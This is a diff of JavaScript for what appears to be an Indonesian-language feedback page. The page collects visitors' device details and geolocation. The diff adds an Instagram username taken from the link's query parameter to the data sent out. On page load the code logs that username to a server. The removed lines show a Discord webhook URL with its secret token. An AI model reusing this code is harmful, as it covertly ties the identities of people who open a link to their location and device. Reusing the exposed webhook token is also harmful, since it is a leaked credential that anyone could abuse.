@@ -11,6 +11,10 @@ document.addEventListener('DOMContentLoaded', () => {
         const userAgent = navigator.userAgent;
         let locationInfo = 'Lokasi tidak tersedia';
 
+        // Get Instagram username from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const instagramUsername = urlParams.get('rrrrdap.1'); // Adjust 'rrrrdap.1' to match the actual query parameter
+
         // Attempt to get the user's location
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (position) => {
@@ -42,7 +46,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
         async function sendFeedback() {
             const payload = {
-                content: `**Nama:** ${name}\n**Pesan:** ${message}\n**Perangkat:** ${userAgent}\n**Lokasi:** ${locationInfo}`
+                content: `**Nama:** ${name}\n**Pesan:** ${message}\n**Perangkat:** ${userAgent}\n**Lokasi:** ${locationInfo}\n**Instagram Username:** ${instagramUsername || 'Tidak disediakan'}`
             };
 
             try {
@@ -78,7 +82,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Log Instagram username on page load (if provided in URL)
     const urlParams = new URLSearchParams(window.location.search);
-    const instagramUsername = urlParams.get('rrrrdap.1'); // Adjust 'username' to match the actual query parameter
+    const instagramUsername = urlParams.get('rrrrdap.1'); // Adjust 'rrrrdap.1' to match the actual query parameter
 
     if (instagramUsername) {
         logInstagramUsername(instagramUsername);
@@ -93,17 +97,6 @@ document.addEventListener('DOMContentLoaded', () => {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({ username })
-            });
-
-            // Log username to Discord
-            await fetch('https://discord.com/api/webhooks/1250487187489947851/wDyA2tTG6aqE8JKpQ2CvImu7LOzIbx08Vqm_6Z3G5Uw68I9qwFyMums9vNrPfUIml3iw', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    content: `**Instagram Username:** ${username}`
-                })
             });
 
         } catch (error) {
